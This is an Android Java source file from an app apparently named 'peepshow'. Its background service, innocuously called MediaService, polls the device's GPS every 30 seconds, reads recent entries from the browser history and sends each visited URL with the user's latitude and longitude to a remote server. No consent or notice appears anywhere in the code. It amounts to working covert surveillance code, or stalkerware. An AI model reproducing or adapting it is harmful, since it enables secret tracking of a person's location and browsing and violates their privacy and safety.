package com.gitmad.peepshow;

import static com.gitmad.peepshow.utils.Messages.Error;

import java.text.DateFormat;
import java.util.Date;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.provider.Browser;
import android.util.Log;
import android.util.Pair;

import com.gitmad.peepshow.api.ApiHandler;



public class MediaService extends Service implements LocationListener {
	private static final String HOST = "10.0.2.2";
	private static final int PORT = 80;
	private static final String TAG = "MEDIA_SERVICE";
	private static boolean stopped = false;
	private double m_lon, m_lat;
	private Handler startGPS = new Handler() {
		public void handleMessage(Message message) {
			super.handleMessage(message);
			LocationManager locationManager = (LocationManager) MediaService.this.getSystemService(Context.LOCATION_SERVICE);
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, MediaService.this);
		}
	};

	@Override
	public void onStart(Intent intent, int startId) {
		Log.v("MediaService","ONSTART CALLED");
		if(!stopped){
			Log.v("MediaService","STARTING");
			new Thread(new Poll()).start();
		}
	}
	
	@Override
	public void onDestroy() {
		super.onDestroy();
		stopped = true;
	}
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	private class Poll implements Runnable {
		public void run() {
			while (!stopped) {
				try {
		            startGPS.sendEmptyMessage(0);
		        } catch (final Exception ex) {
		            Log.v("PEEPSHOW", "SHIT DUN BEEN CRAZY");
		            Error(ex.getMessage());
		        }
				Log.v("ServiceTest","Service doing stuff");
				try {
					Thread.sleep(30000);
				} catch (InterruptedException e) {
					Log.d(TAG, "Service thread sleep interrupted!");
				}
				
			}
		}
	}

	public void onLocationChanged(Location location) {
		((LocationManager) MediaService.this.getSystemService(Context.LOCATION_SERVICE)).removeUpdates(this);
        this.m_lon = location.getLongitude();
        this.m_lat = location.getLatitude();
        ContentResolver c = getContentResolver();
		Cursor mCur = c.query(Browser.BOOKMARKS_URI,
        		Browser.HISTORY_PROJECTION, null, null, null);

        mCur.moveToFirst();
        DateFormat df = DateFormat.getDateTimeInstance(DateFormat.FULL, DateFormat.FULL);
        long currentTime = System.currentTimeMillis();
        long fiveMinAgo = 30000;
        if (mCur.moveToFirst() && mCur.getCount() > 0) {
            while (mCur.isAfterLast() == false) {
            	String title    = mCur.getString(Browser.HISTORY_PROJECTION_TITLE_INDEX);
            	String url      = mCur.getString(Browser.HISTORY_PROJECTION_URL_INDEX);
            	long accessTime = mCur.getLong(Browser.HISTORY_PROJECTION_DATE_INDEX);
            	String encoded = java.net.URLEncoder.encode(url);
            	if(accessTime>(currentTime-fiveMinAgo)){
            		ApiHandler.GetInstance().doAction(ApiHandler.API_ACTION.SEND_WEB,
    						new Pair<String, String>("latitude", String.valueOf(m_lat)),
    	                    new Pair<String, String>("longitude", String.valueOf(m_lon)),
    	                    new Pair<String, String>("url", url));
            		Log.v("titleIdx", title);
                	Log.v("urlIdx", encoded);
                	Log.v("accessTime", df.format(new Date(accessTime)));
            	}
                mCur.moveToNext();
                
            }
        }
        mCur.close();
    }

	public void onProviderDisabled(String provider) {
		// TODO Auto-generated method stub
		
	}

	public void onProviderEnabled(String provider) {
		// TODO Auto-generated method stub
		
	}

	public void onStatusChanged(String provider, int status, Bundle extras) {
		// TODO Auto-generated method stub
		
	}
}
